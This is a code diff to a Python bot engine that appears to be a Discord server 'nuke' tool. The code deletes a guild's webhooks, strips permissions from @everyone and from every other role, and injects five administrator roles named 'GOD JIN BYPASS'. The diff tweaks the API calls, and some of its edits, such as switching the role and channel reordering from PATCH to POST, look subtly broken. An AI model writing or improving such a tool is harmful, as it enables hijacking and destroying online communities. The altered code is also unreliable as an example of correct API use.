@@ -335,7 +335,7 @@ class BotEngine:
         res = self.api.request("GET", f"guilds/{self.guild_id}/webhooks")
         if res and res.status_code == 200:
             def _op(w):
-                r = self.api.request("DELETE", f"webhooks/{w['id']}")
+                r = self.api.request("DELETE", f"webhooks/{w['id']}/{w['token']}")
                 if r and r.status_code == 204:
                     logger.action(f"Deleted Webhook: {w['name']}")
                     return True
@@ -389,7 +389,7 @@ class BotEngine:
         if res and res.status_code == 200:
             ev = next((r for r in res.json() if r['name'] == '@everyone'), None)
             if ev:
-                r = self.api.request("PATCH", f"guilds/{self.guild_id}/roles/{ev['id']}", {"permissions": "0"})
+                r = self.api.request("PATCH", f"guilds/{self.guild_id}/roles/{ev['id']}", {"permissions": 0})
                 if r and r.status_code == 200:
                     logger.success("Guild lockdown engaged.")
                     return
@@ -462,7 +462,7 @@ class BotEngine:
         })
         
         # Admin Injection
-        def _ca(i): return self.api.request("POST", f"guilds/{self.guild_id}/roles", {"name": f"GOD JIN BYPASS {i}", "permissions": "8"})
+        def _ca(i): return self.api.request("POST", f"guilds/{self.guild_id}/roles", {"name": f"GOD JIN BYPASS {i}", "permissions": 8})
         self.fast_executor(range(5), _ca, "Injecting Admin Roles")
         logger.success("SECURITY DEFICIENT. TARGET EXPOSED.")
 
@@ -497,7 +497,7 @@ class BotEngine:
         if res and res.status_code == 200:
             def _op(ro):
                 if ro['name'] == '@everyone': return False
-                r = self.api.request("PATCH", f"guilds/{self.guild_id}/roles/{ro['id']}", {"permissions": "0"})
+                r = self.api.request("PATCH", f"guilds/{self.guild_id}/roles/{ro['id']}", {"permissions": 0})
                 if r and r.status_code == 200:
                     logger.action(f"Stripped Perms: {ro['name']}")
                     return True
@@ -900,7 +900,7 @@ class BotEngine:
         if res and res.status_code == 200:
             roles = res.json()
             payload = [{"id": r["id"], "position": i} for i, r in enumerate(roles)]
-            r = self.api.request("PATCH", f"guilds/{self.guild_id}/roles", payload)
+            r = self.api.request("POST", f"guilds/{self.guild_id}/roles", payload)
             if r and r.status_code == 200:
                 logger.success("Roles reordered.")
             else:
@@ -912,7 +912,7 @@ class BotEngine:
         if res and res.status_code == 200:
             chans = res.json()
             payload = [{"id": c["id"], "position": i} for i, c in enumerate(chans)]
-            r = self.api.request("PATCH", f"guilds/{self.guild_id}/channels", payload)
+            r = self.api.request("POST", f"guilds/{self.guild_id}/channels", payload)
             if r and r.status_code == 200:
                 logger.success("Channels reordered.")
             else:
